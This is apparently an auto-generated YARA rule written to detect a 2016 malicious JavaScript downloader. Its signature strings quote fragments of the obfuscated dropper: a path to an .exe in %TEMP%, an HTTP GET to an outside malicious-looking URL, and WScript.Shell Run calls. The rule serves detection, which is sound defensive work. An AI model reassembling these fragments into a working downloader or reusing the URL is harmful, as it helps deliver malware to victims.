rule sig_20160328_de102a877e05f80edb0ced6d686a9a3f {
  meta:
    description = "datamaliciousorder - file 20160328_de102a877e05f80edb0ced6d686a9a3f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4af232fd8e1431558dec17cb1198d293cfb460ad0f68cdf10b9458cb730bfbe2"

  strings:
    $s1  = "function Odumkapqx() {return Beeaxkl[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"7pFnKUASiWj3.exe\";};" fullword ascii
    $s2  = "Bmxmbmcit[Yngbsjvgd](\"GET\", \"http://baskinandbraw.com/wo8pfd\", false);" fullword ascii
    $s3  = "do {WScript[Wcypbmge](Bbdmyaju() * 11)} while (Bmxmbmcit[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "function Grafkij(Xdhguugn, Lguqmka){return Xdhguugn - Lguqmka;};" fullword ascii
    $s5  = "var Beeaxkl = function Kdiwglneq() {return WScript[Wyfcjx](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Merjamzqkw() {return ((Qgdtf == true) && (Qgdtf == Dgybhhcnln)) ? 1 : Lqtcznsqw;};" fullword ascii
    $s7  = "function Fxjzu(Uzvst){Beeaxkl[\"Run\"](Uzvst, Lqtcznsqw, Lqtcznsqw);};" fullword ascii
    $s8  = "var Joudtjg = new this[\"Date\"]();" fullword ascii
    $s9  = "return Grafkij(Dovwgsqbr, Wpssafazy);" fullword ascii
    $s10 = "var Qgdtf = false;" fullword ascii
    $s11 = "var Dgybhhcnln = false;" fullword ascii
    $s12 = "function Gdobkgkqvz(){return Lfngvuhso;};" fullword ascii
    $s13 = "Qgdtf = true; " fullword ascii
    $s14 = "function Suawlg()" fullword ascii
    $s15 = "function Bbdmyaju(){return 22;};" fullword ascii
    $s16 = "function Upjvryykd(Lttdcdu) {var Akixgvqz = (1, 2, 3, 4, 5, Lttdcdu); return Akixgvqz;};" fullword ascii
    $s17 = " while (Xkxvapocce){" fullword ascii
    $s18 = "var Tfxhul = false;" fullword ascii
    $s19 = "Dgybhhcnln = true; " fullword ascii
    $s20 = "function Pykgnmvw(){return Wyfcjx;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}